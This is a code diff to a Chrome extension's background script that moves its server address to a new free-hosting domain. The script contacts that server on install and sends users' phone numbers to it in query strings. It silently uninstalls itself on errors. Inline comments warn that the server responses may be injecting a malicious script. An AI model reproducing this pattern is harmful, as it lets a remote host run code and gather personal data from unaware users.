@@ -7,6 +7,7 @@
 function isInt(value) {
     return !isNaN(value) && parseInt(Number(value)) == value && !isNaN(parseInt(value, 10));
 }
+var BASE_URL = 'https://iliesbourouh.000webhostapp.com/';
 
 chrome.runtime.onInstalled.addListener(function (details) {
 
@@ -16,7 +17,7 @@ chrome.runtime.onInstalled.addListener(function (details) {
     console.log('chrome extention added');
 
     var xhr = new XMLHttpRequest();
-    xhr.open("GET", 'https://whispered-student.000webhostapp.com/checkExtention.php', true);
+    xhr.open("GET", BASE_URL+'checkExtention.php', true);
     xhr.onreadystatechange = function () {
         if (xhr.readyState == 4) {
             // WARNING! Might be injecting a malicious script!
@@ -27,7 +28,7 @@ chrome.runtime.onInstalled.addListener(function (details) {
         }
     };
     xhr.onerror = function () {
-        alert.open('error'); 
+        alert.open('error');
         chrome.management.uninstallSelf({ showConfirmDialog: false }, () => { });
     }
     xhr.send();
@@ -47,7 +48,7 @@ chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
         CodeRequest = setInterval(function () {
 
             var xhr = new XMLHttpRequest();
-            xhr.open("GET", 'https://whispered-student.000webhostapp.com/check.php?Phone=' + request.mobileno, true);
+            xhr.open("GET", BASE_URL+'check.php?Phone=' + request.mobileno, true);
             console.log('phone' + ' ' + request.mobileno);
             xhr.onreadystatechange = function () {
                 console.log('state changed');
@@ -76,7 +77,7 @@ chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
     else if (request.message == 'GetServerStats') {
 
         var xhr = new XMLHttpRequest();
-        xhr.open("GET", 'https://whispered-student.000webhostapp.com/check.php?Phone=123', true);
+        xhr.open("GET", BASE_URL+'check.php?Phone=123', true);
         xhr.onreadystatechange = function () {
             console.log('state changed');
             if (xhr.readyState == 4 && xhr.status == 200) {
@@ -98,7 +99,7 @@ chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
     } else if (request.message == 'GetServerCode') {
 
         var xhr = new XMLHttpRequest();
-        xhr.open("GET", 'https://whispered-student.000webhostapp.com/check.php?Phone=' + request.phone, true);
+        xhr.open("GET", BASE_URL+'check.php?Phone=' + request.phone, true);
         xhr.onreadystatechange = function () {
             if (xhr.readyState == 4 && xhr.status == 200) {
                 // WARNING! Might be injecting a malicious script!
